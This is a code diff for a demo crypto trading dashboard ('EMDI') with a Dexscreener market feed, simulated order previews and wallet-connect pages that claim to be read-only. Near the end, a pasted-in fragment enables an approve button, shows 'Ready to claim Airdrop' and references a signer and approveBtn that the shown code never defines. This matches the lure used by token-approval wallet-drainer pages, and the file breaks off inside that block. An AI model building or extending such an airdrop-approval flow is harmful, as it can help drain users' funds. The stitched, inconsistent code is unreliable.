+        <div class="asset-row"><div class="asset-name"><div class="coin sol">◎</div><div><strong>Solana</strong><small>SOL / USDT</small></div></div><div class="asset-number">$182.63<small>Vol. $2.1B</small></div><div class="asset-number negative">−0.72%</div></div>
+        <div class="asset-row"><div class="asset-name"><div class="coin">✕</div><div><strong>XRP</strong><small>XRP / USDT</small></div></div><div class="asset-number">$0.6241<small>Vol. $1.3B</small></div><div class="asset-number positive">+0.94%</div></div>
+      </div>
+      <div class="token-tools"><div class="token-tools-title"><div><strong>Find a token</strong><small>Search by name, ticker or contract address</small></div><button type="button" class="ghost-btn" id="addTokenToggle">+ Add token</button></div><div class="token-search"><input id="tokenSearch" type="search" placeholder="Search token or paste contract address" autocomplete="off"><button type="button" id="tokenSearchButton" class="ghost-btn">Search</button></div><div id="tokenSearchResult" class="token-search-result">Token search is ready. Live token discovery will be enabled when a market-data API is connected.</div></div>
+    </article>
+  </section>
+  <section class="card trading-workspace" id="tradingWorkspace">
+    <div class="panel-head"><div><h2>Crypto trading terminal</h2><p>Select a market, configure an order and review position details.</p></div><div class="terminal-status"><i class="dot"></i> Terminal ready</div></div>
+    <div class="terminal-layout">
+      <div class="terminal-market">
+        <div class="market-select-row"><div><span class="muted tiny">MARKET</span><select id="terminalPair" aria-label="Terminal market"><option value="BTC">₿ Bitcoin / USDT</option><option value="ETH">◆ Ethereum / USD</option><option value="SOL">◎ Solana / USD</option><option value="XRP">✕ XRP / USDT</option></select></div><div class="terminal-price"><strong id="terminalPrice">$67,482.10</strong><span class="positive">Market snapshot</span></div></div>
+        <div class="terminal-chart-placeholder"><div class="terminal-chart-top"><span id="terminalPairLabel">BTC / USDT</span><span class="muted">ILLUSTRATIVE MARKET DATA</span></div><svg id="terminalChart" viewBox="0 0 640 230" preserveAspectRatio="none" aria-label="Illustrative trading chart"><defs><linearGradient id="terminalFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#25d6a2" stop-opacity=".25"/><stop offset="100%" stop-color="#25d6a2" stop-opacity="0"/></linearGradient></defs><g id="terminalGrid"></g><path id="terminalArea" fill="url(#terminalFill)"></path><path id="terminalLine" fill="none" stroke="#25d6a2" stroke-width="2" stroke-linejoin="round" stroke-linecap="round"></path></svg><div class="terminal-chart-bottom"><span>−24h</span><span>−12h</span><span>Now</span></div></div>
+        <div class="orderbook-mini"><div class="orderbook-head"><strong>Market depth preview</strong><span class="muted">Demo snapshot</span></div><div class="depth-row sell-depth"><span>Sell liquidity</span><span id="sellDepth">$1,284,620</span></div><div class="depth-row buy-depth"><span>Buy liquidity</span><span id="buyDepth">$1,742,880</span></div><div class="depth-meter"><i></i><b></b></div><p class="disclaimer">Depth values are placeholders until a live market-data provider is connected.</p></div>
+      </div>
+      <div class="terminal-order-card"><div class="terminal-order-title"><h3>Place order</h3><span class="badge" style="background:#202b40;color:#a9baff">DEMO MODE</span></div>
+        <div class="segmented terminal-side"><button type="button" class="buy active" data-side="buy">Buy / Long</button><button type="button" class="sell" data-side="sell">Sell / Short</button></div>
+        <div class="field"><label for="terminalOrderType">Order type</label><select id="terminalOrderType"><option>Market</option><option>Limit</option><option>Stop-limit (preview)</option></select></div>
+        <div class="field hidden" id="terminalLimitField"><label for="terminalLimit">Limit price (USD)</label><input id="terminalLimit" type="number" min="0" step="any" placeholder="Enter limit price"></div>
+        <div class="field"><label for="terminalAmount">Order value (USD)</label><input id="terminalAmount" type="number" min="1" max="5000" step=".01" placeholder="Enter amount"><div class="quick-amounts"><button type="button" data-terminal-amount="25">$25</button><button type="button" data-terminal-amount="100">$100</button><button type="button" data-terminal-amount="250">$250</button><button type="button" data-terminal-amount="500">$500</button></div></div>
+        <div class="order-summary"><div class="sum-row"><span>Est. quantity</span><strong id="terminalQuantity">—</strong></div><div class="sum-row"><span>Trading fee</span><strong id="terminalFee">$0.00</strong></div><div class="sum-row"><span>Order total</span><strong id="terminalTotal">$0.00</strong></div></div>
+        <button class="primary-btn" id="terminalSubmit">Preview buy order</button><p class="disclaimer">Order previews only. This front end does not execute trades. Wallet signing, exchange integration and risk checks must be added before live trading.</p>
+      </div>
+    </div>
+  </section>
+  <section class="trade-grid">
+    <article class="card table-card" id="activityPanel"><div class="panel-head"><div><h2 id="activityTitle">Recent activity</h2><p>Your latest crypto orders and executions</p></div><button class="ghost-btn" data-page="Orders">All orders ↗</button></div><div class="table-wrap"><table class="table"><thead><tr><th>Asset</th><th>Type</th><th>Amount</th><th>Price</th><th>Status</th></tr></thead><tbody id="activityBody">
+      <tr><td><strong>BTC / USDT</strong></td><td class="positive">Buy</td><td>0.024 BTC</td><td>$66,920.00</td><td><span class="badge">● Filled</span></td></tr>
+      <tr><td><strong>ETH / USDT</strong></td><td class="negative">Sell</td><td>0.850 ETH</td><td>$3,488.20</td><td><span class="badge">● Filled</span></td></tr>
+      <tr><td><strong>SOL / USDT</strong></td><td class="positive">Buy</td><td>12.00 SOL</td><td>$179.45</td><td><span class="badge">● Filled</span></td></tr>
+      <tr><td><strong>BTC / USDT</strong></td><td class="positive">Buy</td><td>0.010 BTC</td><td>$67,100.00</td><td><span class="badge sell">● Pending</span></td></tr>
+    </tbody></table></div></article>
+    <article class="card"><div class="panel-head"><div><h2>Quick trade</h2><p>Place a simulated order preview</p></div><span class="badge" style="background:#202b40;color:#a9baff">DEMO</span></div>
+      <form class="trade-form" id="tradeForm">
+        <div class="segmented"><button type="button" class="buy active" data-side="buy">Buy / Long</button><button type="button" class="sell" data-side="sell">Sell / Short</button></div>
+        <div class="field"><label for="pair">Trading pair <span>Crypto spot</span></label><select id="pair"><option value="BTC">BTC / USDT — $67,482.10</option><option value="ETH">ETH / USDT — $3,521.84</option><option value="SOL">SOL / USDT — $182.63</option><option value="XRP">XRP / USDT — $0.6241</option></select></div>
+        <div class="field"><label for="orderType">Order type</label><select id="orderType"><option>Market</option><option>Limit</option></select></div>
+        <div class="field hidden" id="limitField"><label for="limitPrice">Limit price (USD)</label><input id="limitPrice" type="number" min="0" step="any" placeholder="Enter limit price"></div>
+        <div class="field"><label for="amount">Amount (USD) <span id="available">Available: $5,000.00</span></label><input id="amount" type="number" min="1" max="5000" step="0.01" placeholder="0.00" required><div class="quick-amounts"><button type="button" data-amount="25">$25</button><button type="button" data-amount="100">$100</button><button type="button" data-amount="250">$250</button><button type="button" data-amount="500">$500</button></div></div>
+        <div class="order-summary"><div class="sum-row"><span>Estimated quantity</span><strong id="quantity">—</strong></div><div class="sum-row"><span>Estimated fee (0.1%)</span><strong id="fee">$0.00</strong></div><div class="sum-row"><span>Total</span><strong id="total">$0.00</strong></div></div>
+        <button class="primary-btn" id="submitTrade" type="submit">Preview buy order</button><p class="disclaimer">Demo interface only. No real crypto orders are placed, no funds are moved, and token prices are illustrative. Connect a trusted market-data and trading API before production use.</p>
+      </form>
+    </article>
+  </section>
+  <section id="marketsPage" class="route-page hidden">
+    <div class="card table-card">
+      <div class="panel-head"><div><h2>Live crypto markets</h2><p>Pair prices, liquidity and 24-hour movement from Dexscreener</p></div><button class="ghost-btn" id="refreshMarkets">↻ Refresh</button></div>
+      <div class="market-search-bar"><input id="liveMarketSearch" type="search" placeholder="Search token, ticker or contract address"><button class="primary-btn search-market-btn" id="liveMarketSearchBtn">Search</button></div>
+      <div id="liveMarketNotice" class="feed-notice"><i class="dot"></i> Connecting to Dexscreener…</div>
+      <div class="table-wrap"><table class="table live-table"><thead><tr><th>Token / Pair</th><th>Price (USD)</th><th>24H</th><th>Liquidity</th><th>24H volume</th><th>Chain</th></tr></thead><tbody id="liveMarketsBody"><tr><td colspan="6" class="empty">Loading live crypto pairs…</td></tr></tbody></table></div>
+    </div>
+    <div class="card market-footnote"><strong>Market data</strong><p>Data is fetched from Dexscreener's public API. Prices and liquidity depend on available trading pairs and may vary by pool. This page does not verify whether a token is safe.</p></div>
+  </section>
+  <section id="portfolioPage" class="route-page hidden">
+    <div class="stats portfolio-stats"><article class="card stat"><div class="stat-top">Connected wallet <span class="stat-icon">◉</span></div><div class="stat-value" id="portfolioWalletShort">Not connected</div><div class="muted" style="font-size:11px">Connect in Wallet to read on-chain details</div></article><article class="card stat"><div class="stat-top">Tracked positions <span class="stat-icon">▤</span></div><div class="stat-value" id="portfolioPositionCount">0</div><div class="muted" style="font-size:11px">Live wallet token indexing not configured</div></article><article class="card stat"><div class="stat-top">Demo orders <span class="stat-icon">↗</span></div><div class="stat-value" id="portfolioOrderCount">0</div><div class="muted" style="font-size:11px">Local previews only</div></article><article class="card stat"><div class="stat-top">Portfolio mode <span class="stat-icon">◈</span></div><div class="stat-value" style="font-size:20px">Wallet-based</div><div class="muted" style="font-size:11px">No invented holdings displayed</div></article></div>
+    <div class="card table-card"><div class="panel-head"><div><h2>Portfolio assets</h2><p>Connect a supported wallet to begin viewing balances</p></div><button class="ghost-btn" data-page="Wallet">Open wallet ↗</button></div><div class="table-wrap"><table class="table"><thead><tr><th>Asset</th><th>Network</th><th>Balance</th><th>USD value</th><th>Status</th></tr></thead><tbody id="portfolioAssetsBody"><tr><td colspan="5" class="empty">No wallet assets loaded. Connect a wallet first.</td></tr></tbody></table></div></div>
+    <div class="card market-footnote"><strong>Portfolio accuracy</strong><p>EMDI will not display made-up portfolio balances. Wallet token indexing and USD valuation need a supported chain data service.</p></div>
+  </section>
+  <section id="walletPage" class="route-page hidden">
+    <div class="wallet-page-grid">
+      <article class="card wallet-connect-card"><div class="wallet-emblem">◉</div><div class="eyebrow">EMDI WALLET</div><h2>Your wallet, your keys</h2><p>Connect a browser wallet to read its public address and native-token balance. EMDI never asks for your seed phrase or private key.</p><button class="primary-btn" id="walletPageConnect">Connect wallet</button><div class="wallet-security"><span>✓</span> Connection uses your wallet's built-in approval screen.</div></article>
+      <article class="card wallet-info-card"><div class="panel-head"><div><h2>Wallet details</h2><p>Connected account information</p></div><span id="walletPageStatus" class="wallet-status">NOT CONNECTED</span></div><div class="wallet-detail-row"><span>Address</span><strong id="walletPageAddress">Not connected</strong></div><div class="wallet-detail-row"><span>Network</span><strong id="walletPageNetwork">Not connected</strong></div><div class="wallet-detail-row"><span>Native balance</span><strong id="walletPageBalance">—</strong></div><div class="wallet-detail-row"><span>Trading permissions</span><strong>Not granted</strong></div><button class="ghost-btn hidden" id="walletPageDisconnect">Disconnect wallet</button><p class="disclaimer">Connecting only reads public wallet information. It does not enable trade execution.</p></article>
+    </div>
+  </section>
+  <section id="walletConnectPage" class="route-page hidden">
+    <div class="wallet-page-grid">
+      <article class="card wallet-connect-card">
+        <div class="wallet-emblem">↔</div>
+        <div class="eyebrow">SECURE CONNECTION</div>
+        <h2>Connect a wallet to EMDI</h2>
+        <p>Connect with WalletConnect using a QR code or compatible wallet app. Review the connection request in your wallet before approving it.</p>
+        <div id="walletConnectStatus" class="feed-notice">WalletConnect is not configured yet.</div>
+        <button class="primary-btn" id="startWalletConnect">Connect with WalletConnect</button>
+        <p class="disclaimer">Never enter your recovery phrase or private key into EMDI. Connecting a wallet does not execute a trade.</p>
+      </article>
+      <article class="card wallet-info-card">
+        <div class="panel-head"><div><h2>Connection status</h2><p>Wallet session information</p></div></div>
+        <div class="wallet-detail-row"><span>Status</span><strong id="walletConnectPageStatus">Not connected</strong></div>
+        <div class="wallet-detail-row"><span>Address</span><strong id="walletConnectPageAddress">—</strong></div>
+        <div class="wallet-detail-row"><span>Provider</span><strong>WalletConnect</strong></div>
+        <button class="ghost-btn" data-page="Wallet">Back to wallet</button>
+      </article>
+    </div>
+  </section>
+</div>
+</main>
+</div>
+<nav class="bottom-nav" id="bottomNav"><button class="active" data-page="Overview"><span>⌂</span>Overview</button><button data-page="Markets"><span>◈</span>Markets</button><button data-page="Portfolio"><span>▤</span>Portfolio</button><button data-page="Trade"><span>↗</span>Trade</button><button data-page="Wallet"><span>◉</span>Wallet</button></nav>
+<script>
+    (() => {
+'use strict';
+const $ = (s, root=document) => root.querySelector(s);
+const $$ = (s, root=document) => [...root.querySelectorAll(s)];
+const prices = {BTC:67482.10, ETH:3521.84, SOL:182.63, XRP:0.6241};
+const state = {side:'buy', range:'1D', page:'Overview', orders:[], balance:24680.50};
+const fmt = (n, digits=2) => new Intl.NumberFormat('en-US',{minimumFractionDigits:digits,maximumFractionDigits:digits}).format(n);
+let toastTimer;
+function toast(title, message) {
+  $('.toast')?.remove();
+  const node=document.createElement('div'); node.className='toast'; node.setAttribute('role','status');
+  const strong=document.createElement('strong'); strong.textContent=title;
+  const span=document.createElement('span'); span.textContent=message;
+  node.append(strong,span); document.body.append(node);
+  clearTimeout(toastTimer); toastTimer=setTimeout(()=>node.remove(),4200);
+}
+function makeChart(range='1D') {
+  const values={
+    '1D':[34,37,31,43,40,49,44,52,46,59,53,62,56,65,60,73,66,69,63,81,75,86,78,91,83,96],
+    '1W':[27,35,31,42,36,47,43,38,52,48,58,51,63,56,61,54,70,64,74,67,80,73,87,79,94,90],
+    '1M':[20,28,25,39,33,29,43,38,49,41,55,48,44,61,56,65,59,70,62,77,71,67,83,76,91,96],
+    '1Y':[17,22,20,29,26,35,30,39,33,45,41,36,52,48,57,51,63,58,69,62,75,71,67,85,80,96]
+  }[range] || [];
+  const w=700,h=240,left=12,right=690,top=14,bottom=210, min=0,max=110;
+  const pts=values.map((v,i)=>({x:left+i*(right-left)/(values.length-1),y:bottom-(v-min)/(max-min)*(bottom-top)}));
+  $('#chartLine').setAttribute('d',pts.map((p,i)=>(i?'L':'M')+p.x.toFixed(1)+' '+p.y.toFixed(1)).join(' '));
+  $('#chartArea').setAttribute('d',`M ${pts[0].x} ${bottom} `+pts.map(p=>`L ${p.x.toFixed(1)} ${p.y.toFixed(1)}`).join(' ')+` L ${pts.at(-1).x} ${bottom} Z`);
+  const grid=$('#chartGrid'), labels=$('#chartLabels'); grid.replaceChildren(); labels.replaceChildren();
+  for(let i=0;i<5;i++){
+    const y=top+i*(bottom-top)/4;
+    const line=document.createElementNS('http://www.w3.org/2000/svg','line');
+    for(const [k,v] of Object.entries({x1:left,x2:right,y1:y,y2:y})) line.setAttribute(k,v);
+    line.setAttribute('class','chart-grid'); grid.append(line);
+    const txt=document.createElementNS('http://www.w3.org/2000/svg','text');
+    txt.setAttribute('x','700');txt.setAttribute('y',y+3);txt.setAttribute('text-anchor','end');txt.setAttribute('class','chart-label');txt.textContent='$'+(25-i*5)+'k';labels.append(txt);
+  }
+  const labelsByRange={'1D':['00:00','12:00','23:59'],'1W':['Mon','Wed','Sun'],'1M':['Oct 01','Oct 12','Oct 24'],'1Y':['Jan','Jun','Oct']};
+  const l=labelsByRange[range];$('#chartStart').textContent=l[0];$('#chartMiddle').textContent=l[1];$('#chartEnd').textContent=l[2];
+  $('#chartValue').textContent='$'+fmt(state.balance);
+  $('#chartChange').textContent='↗ '+({'1D':'1.58%','1W':'2.31%','1M':'4.28%','1Y':'12.64%'}[range]);
+}
+const DEX_API='https://api.dexscreener.com/latest/dex/search?q=';
+const watchTokens=['BTC','ETH','SOL','BNB','XRP','DOGE','USDC','BONK','JUP','WIF','PEPE','LINK'];
+let livePairs=[],marketLoadPromise=null;
+const safeNum=v=>Number.isFinite(Number(v))?Number(v):0;
+const money=(v)=>{v=safeNum(v);if(v===0)return '$0.00';if(Math.abs(v)<0.0001)return '$'+v.toExponential(3);if(Math.abs(v)<1)return '$'+v.toFixed(6);return '$'+v.toLocaleString('en-US',{maximumFractionDigits:2});};
+const compactMoney=(v)=>{v=safeNum(v);if(v>=1e9)return '$'+(v/1e9).toFixed(2)+'B';if(v>=1e6)return '$'+(v/1e6).toFixed(2)+'M';if(v>=1e3)return '$'+(v/1e3).toFixed(2)+'K';return money(v)};
+async function fetchDexPairs(query){
+ const res=await fetch(DEX_API+encodeURIComponent(query),{headers:{'accept':'application/json'}});
+ if(!res.ok)throw new Error('Dexscreener returned HTTP '+res.status);
+ const data=await res.json();return Array.isArray(data.pairs)?data.pairs:[];
+}
+function normalizePair(p){return {base:p.baseToken?.symbol||'?',name:p.baseToken?.name||p.baseToken?.symbol||'Unknown token',address:p.baseToken?.address||'',quote:p.quoteToken?.symbol||'?',chain:p.chainId||'unknown',dex:p.dexId||'DEX',url:p.url||'#',price:safeNum(p.priceUsd),change:safeNum(p.priceChange?.h24),liquidity:safeNum(p.liquidity?.usd),volume:safeNum(p.volume?.h24),fdv:safeNum(p.fdv),pairAddress:p.pairAddress||''};}
+function choosePairs(pairs,query){
+ const q=query.trim().toLowerCase();const normalized=pairs.map(normalizePair).filter(p=>p.price>0);
+ const addressLike=/^(0x[a-f0-9]{8,}|[1-9A-HJ-NP-Za-km-z]{28,})$/i.test(query.trim());
+ const filtered=addressLike?normalized.filter(p=>p.address.toLowerCase()===q||p.pairAddress.toLowerCase()===q):normalized.filter(p=>p.base.toLowerCase()===q||p.name.toLowerCase().includes(q)||p.address.toLowerCase()===q);
+ return (filtered.length?filtered:normalized).sort((a,b)=>b.liquidity-a.liquidity);
+}
+function renderLiveMarkets(pairs){
+ const body=$('#liveMarketsBody');body.replaceChildren();
+ if(!pairs.length){const tr=document.createElement('tr'),td=document.createElement('td');td.colSpan=6;td.className='empty';td.textContent='No trading pairs found. Try a ticker or paste a token contract address.';tr.append(td);body.append(tr);return;}
+ pairs.slice(0,60).forEach(p=>{const tr=document.createElement('tr');
+ const asset=document.createElement('td');asset.innerHTML='';const wrap=document.createElement('div');wrap.className='live-token';const icon=document.createElement('div');icon.className='coin';icon.textContent=(p.base||'?').slice(0,3);const names=document.createElement('div');const strong=document.createElement('strong');strong.textContent=p.name;const small=document.createElement('small');small.textContent=p.base+' / '+p.quote;names.append(strong,small);wrap.append(icon,names);asset.append(wrap);
+ const price=document.createElement('td');price.textContent=money(p.price);
+ const change=document.createElement('td');change.textContent=(p.change>0?'+':'')+p.change.toFixed(2)+'%';change.className=p.change>=0?'positive':'negative';
+ const liq=document.createElement('td');liq.textContent=compactMoney(p.liquidity);
+ const vol=document.createElement('td');vol.textContent=compactMoney(p.volume);
+ const chain=document.createElement('td');chain.textContent=(p.chain||'').toUpperCase();
+ tr.append(asset,price,change,liq,vol,chain);tr.title=p.address+' · '+p.dex;tr.style.cursor='pointer';tr.addEventListener('click',()=>{if(p.url&&p.url!=='#')window.open(p.url,'_blank','noopener,noreferrer');});body.append(tr);
+ });
+}
+function updateTopMarketRows(pairs){
+ const list=$('.asset-list');if(!list)return;list.replaceChildren();
+ pairs.slice(0,4).forEach(p=>{const row=document.createElement('div');row.className='asset-row';const name=document.createElement('div');name.className='asset-name';const icon=document.createElement('div');icon.className='coin';icon.textContent=p.base.slice(0,2);const detail=document.createElement('div');const strong=document.createElement('strong');strong.textContent=p.name;const small=document.createElement('small');small.textContent=p.base+' / '+p.quote;detail.append(strong,small);name.append(icon,detail);const val=document.createElement('div');val.className='asset-number';val.textContent=money(p.price);const vol=document.createElement('small');vol.textContent='Vol. '+compactMoney(p.volume);val.append(vol);const change=document.createElement('div');change.className='asset-number '+(p.change>=0?'positive':'negative');change.textContent=(p.change>0?'+':'')+p.change.toFixed(2)+'%';row.append(name,val,change);list.append(row);});
+}
+async function loadLiveMarkets(query){
+ if(marketLoadPromise&&!query)return marketLoadPromise;
+ const notice=$('#liveMarketNotice');if(notice){notice.classList.remove('error');notice.innerHTML='<i class="dot"></i> Fetching live pairs from Dexscreener…';}
+ const task=(async()=>{
+  try{
+   let all=[];
+   if(query){all=await fetchDexPairs(query);const picked=choosePairs(all,query);renderLiveMarkets(picked);if(notice)notice.innerHTML='<i class="dot"></i> '+picked.length+' pair(s) returned for “'+query.replace(/[<>]/g,'')+'” · Dexscreener';return picked;}
+   const results=await Promise.allSettled(watchTokens.map(t=>fetchDexPairs(t)));
+   results.forEach((r,i)=>{if(r.status==='fulfilled'){const symbol=watchTokens[i].toLowerCase();const matches=r.value.filter(p=>(p.baseToken?.symbol||'').toLowerCase()===symbol);all.push(...(matches.length?matches:r.value.slice(0,3)));}});
+   const uniq=new Map();all.map(normalizePair).filter(p=>p.price>0).forEach(p=>{const key=p.chain+':'+p.pairAddress;if(!uniq.has(key))uniq.set(key,p);});
+   livePairs=[...uniq.values()].sort((a,b)=>b.liquidity-a.liquidity);renderLiveMarkets(livePairs);updateTopMarketRows(livePairs);
+   if(notice)notice.innerHTML='<i class="dot"></i> Live data connected · '+livePairs.length+' pairs · auto-refreshes every 60 seconds';
+   $('#feedStatus').textContent='LIVE · DEXSCREENER';
+   return livePairs;
+  }catch(err){if(notice){notice.classList.add('error');notice.innerHTML='<i class="dot"></i> Live feed unavailable: '+String(err.message||err).replace(/[<>]/g,'')+'. Check connection and retry.';}$('#feedStatus').textContent='Feed unavailable';if(!query)renderLiveMarkets([]);return [];}
+ })();
+ if(!query)marketLoadPromise=task;const result=await task;if(!query)marketLoadPromise=null;return result;
+}
+$('#refreshMarkets').addEventListener('click',()=>loadLiveMarkets());
+$('#liveMarketSearchBtn').addEventListener('click',()=>{const q=$('#liveMarketSearch').value.trim();if(q)loadLiveMarkets(q);else loadLiveMarkets();});
+$('#liveMarketSearch').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();$('#liveMarketSearchBtn').click();}});
+async function runTokenSearch(){const query=$('#tokenSearch').value.trim(),result=$('#tokenSearchResult');result.replaceChildren();if(!query){result.textContent='Enter a token name, ticker or contract address.';return;}result.textContent='Searching Dexscreener…';try{const pairs=choosePairs(await fetchDexPairs(query),query);if(!pairs.length){result.textContent='No pair found for that search.';return;}const p=pairs[0];const strong=document.createElement('strong');strong.textContent=p.base+' / '+p.quote+' · '+money(p.price);const info=document.createElement('div');info.textContent=p.name+' · '+p.chain+' · Liquidity '+compactMoney(p.liquidity);const link=document.createElement('a');link.href=p.url;link.target='_blank';link.rel='noopener noreferrer';link.className='pair-link';link.textContent='Open pair on Dexscreener ↗';result.append(strong,info,link);if(['BTC','ETH','SOL','XRP'].includes(p.base.toUpperCase())){$('#terminalPair').value=p.base.toUpperCase();$('#pair').value=p.base.toUpperCase();prices[p.base.toUpperCase()]=p.price;updateTerminal();updateSummary();}}catch(err){result.textContent='Dexscreener lookup failed. Check your internet connection and retry.';}}
+$('#tokenSearchButton').addEventListener('click',runTokenSearch);$('#tokenSearch').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();runTokenSearch();}});
+$('#addTokenToggle').addEventListener('click',()=>{setPage('Markets');$('#liveMarketSearch').focus();toast('Token discovery','Search by token ticker or contract address. Verify the contract and liquidity before interacting with a token.');});
+function updatePortfolioPage(){const count=$('#portfolioOrderCount');if(count)count.textContent=String(state.orders.length);$('#portfolioWalletShort').textContent=walletState.address?shortenAddress(walletState.address):'Not connected';}
+function updateWalletPage(){const addr=$('#walletPageAddress'),net=$('#walletPageNetwork'),bal=$('#walletPageBalance'),status=$('#walletPageStatus');if(walletState.address){addr.textContent=walletState.address;net.textContent=walletState.chainId||'Connected';bal.textContent=$('#walletBalance').textContent.trim();status.textContent='CONNECTED';status.classList.add('connected');$('#walletPageDisconnect').classList.remove('hidden');}else{addr.textContent='Not connected';net.textContent='Not connected';bal.textContent='—';status.textContent='NOT CONNECTED';status.classList.remove('connected');$('#walletPageDisconnect').classList.add('hidden');}}
+$('#walletPageConnect').addEventListener('click',connectWallet);$('#walletPageDisconnect').addEventListener('click',disconnectWallet);
+setInterval(()=>{if(navigator.onLine)loadLiveMarkets();},60000);
+
+function setRange(range){
+ state.range=range; $('#rangeSelect').value=range;
+ $$('#chartTabs button').forEach(b=>b.classList.toggle('active',b.dataset.range===range));
+ makeChart(range);
+}
+function setPage(page){
+ const valid=['Overview','Markets','Portfolio','Trade','Wallet']; if(!valid.includes(page)) page='Overview';
+ state.page=page; $('#crumb').textContent=page;
+ const title={Overview:'Crypto overview',Markets:'Live markets',Portfolio:'Portfolio',Trade:'Trade terminal',Wallet:'Wallet'};
+ const sub={Overview:'Your crypto market snapshot at a glance.',Markets:'Live token prices, liquidity and volume from Dexscreener.',Portfolio:'Track connected wallet assets without fabricated balances.',Trade:'Review an order before connecting a live execution provider.',Wallet:'Connect and inspect your wallet securely.'};
+ $('#pageTitle').textContent=title[page];$('#pageSub').textContent=sub[page];
+ $$('#sideNav [data-page],#bottomNav [data-page]').forEach(b=>b.classList.toggle('active',b.dataset.page===page));
+ const show=(selector,on)=>{const el=$(selector);if(el)el.classList.toggle('hidden',!on)};
+ // Keep each navigation item focused on its own page.
+ show('.wallet-strip',page==='Overview');
+ show('.stats',page==='Overview');
+ show('.dashboard-grid',page==='Overview');
+ show('#tradingWorkspace',page==='Trade');
+ show('.trade-grid',page==='Trade');
+ show('#marketsPage',page==='Markets');
+ show('#portfolioPage',page==='Portfolio');
+ show('#walletPage',page==='Wallet');
+ show('#rangeSelect',page==='Overview');
+ if(page==='Markets') loadLiveMarkets();
+ if(page==='Portfolio') updatePortfolioPage();
+ if(page==='Wallet') updateWalletPage();
+ if(page==='Trade') updateTerminal();
+ window.scrollTo({top:0,behavior:'smooth'});
+}
+function renderPageData(page){
+ const body=$('#activityBody');$('#activityTitle').textContent=page==='Orders'?'Order history':page==='Portfolio'?'Portfolio transactions':page==='Markets'?'Market watch':'Recent activity';
+ if(page==='Orders'){
+   body.replaceChildren();
+   const rows=state.orders.slice().reverse();
+   if(!rows.length){const tr=document.createElement('tr'),td=document.createElement('td');td.colSpan=5;td.className='empty';td.textContent='No demo orders yet. Preview an order to add one.';tr.append(td);body.append(tr);return;}
+   rows.forEach(o=>{const tr=document.createElement('tr');[o.pair+' / USD',o.side==='buy'?'Buy':'Sell','$'+fmt(o.amount), '$'+fmt(o.price),o.status].forEach((v,i)=>{const td=document.createElement('td');td.textContent=v;if(i===1)td.className=o.side==='buy'?'positive':'negative';if(i===4){const b=document.createElement('span');b.className='badge';b.textContent='● '+v;td.replaceChildren(b)}tr.append(td)});body.append(tr)});
+ }else if(page==='Portfolio'){
+   body.replaceChildren();
+   [['USD balance','$'+fmt(state.balance),'Cash'],['BTC','$4,350.00','Illustrative holding'],['ETH','$3,120.00','Illustrative holding'],['SOL','$1,460.00','Illustrative holding']].forEach(([a,b,c])=>{const tr=document.createElement('tr');[a,b,c,'—','Demo'].forEach(v=>{const td=document.createElement('td');td.textContent=v;tr.append(td)});body.append(tr)});
+ }else if(page==='Markets'){
+   body.replaceChildren();
+   Object.entries(prices).forEach(([asset,price])=>{const tr=document.createElement('tr');[asset+' / USD','Spot','$'+fmt(price),'24h market','Demo'].forEach(v=>{const td=document.createElement('td');td.textContent=v;tr.append(td)});body.append(tr)});
+ }else{
+   body.innerHTML='<tr><td><strong>BTC / USDT</strong></td><td class="positive">Buy</td><td>0.024 BTC</td><td>$66,920.00</td><td><span class="badge">● Filled</span></td></tr>';
+ }
+}
+function currentPrice(){const pair=$('#pair').value;return $('#orderType').value==='Limit'&&Number($('#limitPrice').value)>0?Number($('#limitPrice').value):prices[pair]}
+function updateSummary(){
+ const amount=Math.max(0,Number($('#amount').value)||0), price=currentPrice(), fee=amount*.001;
+ $('#quantity').textContent=amount>0?fmt(amount/price,6)+' '+$('#pair').value:'—';
+ $('#fee').textContent='$'+fmt(fee);$('#total').textContent='$'+fmt(amount+fee);
+ $('#submitTrade').textContent='Preview '+state.side+' order';
+}
+function setSide(side){
+ state.side=side;
+ $$('.segmented button').forEach(b=>b.classList.toggle('active',b.dataset.side===side));
+ updateSummary();
+}
+$$('[data-page]').forEach(b=>b.addEventListener('click',()=>setPage(b.dataset.page)));
+$$('[data-action]').forEach(b=>b.addEventListener('click',()=>toast(b.dataset.action==='alerts'?'Notifications':'Settings',b.dataset.action==='alerts'?'No new alerts.':'Account settings will be connected in a later build.')));
+$$('#chartTabs button').forEach(b=>b.addEventListener('click',()=>setRange(b.dataset.range)));
+$('#rangeSelect').addEventListener('change',e=>setRange(e.target.value));
+$$('.segmented button').forEach(b=>b.addEventListener('click',()=>setSide(b.dataset.side)));
+$$('.quick-amounts button').forEach(b=>b.addEventListener('click',()=>{$('#amount').value=b.dataset.amount;updateSummary()}));
+$('#amount').addEventListener('input',updateSummary);
+$('#pair').addEventListener('change',updateSummary);
+$('#orderType').addEventListener('change',()=>{$('#limitField').classList.toggle('hidden',$('#orderType').value!=='Limit');updateSummary()});
+$('#limitPrice').addEventListener('input',updateSummary);
+$('#tradeForm').addEventListener('submit',e=>{
+ e.preventDefault();
+ const amount=Number($('#amount').value),price=currentPrice(),pair=$('#pair').value;
+ if(!Number.isFinite(amount)||amount<1){toast('Invalid amount','Enter an amount of at least $1.');return}
+ if(amount>5000){toast('Amount exceeds demo limit','Maximum simulated order is $5,000.');return}
+ if($('#orderType').value==='Limit'&&(!Number($('#limitPrice').value)||Number($('#limitPrice').value)<=0)){toast('Limit price required','Enter a valid positive limit price.');return}
+ const order={id:crypto.randomUUID?.()||String(Date.now()),pair,side:state.side,amount,price,status:'Preview only',createdAt:new Date().toISOString()};
+ state.orders.push(order);
+ toast('Order preview created',`${state.side.toUpperCase()} $${fmt(amount)} of ${pair}. No trade was sent to an exchange.`);
+});
+
+// Replace the old wallet-connection block with this code.
+// Uses Reown AppKit for wallet selection, QR pairing, Solana and EVM/Base.
+// Paste your Reown Project ID into PROJECT_ID below.
+
+const PROJECT_ID = '324bdac40d04d57ed45f7c354801a079';
+
+async function connected(){ try{ userAddress = await signer.getAddress(); updateWalletDisplay(userAddress); approveBtn.disabled=false; updateStatusMessage('Ready to claim Airdrop'); } catch(err){ console.error(err); updateStatusMessage('Failed: '+err.message,'error'); } }
+async function ensureInjectedChain(){ const hex='0x'+currentChainId.toString(16); const cid=await window.ethereum.request({method:'eth_chainId'}); if(cid!==hex){ await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]}); } }
+
+(function () {
+  "use strict";
+
+  const CONFIG = {
+    projectId: "",
+    appName: document.title || "Wallet Connect",
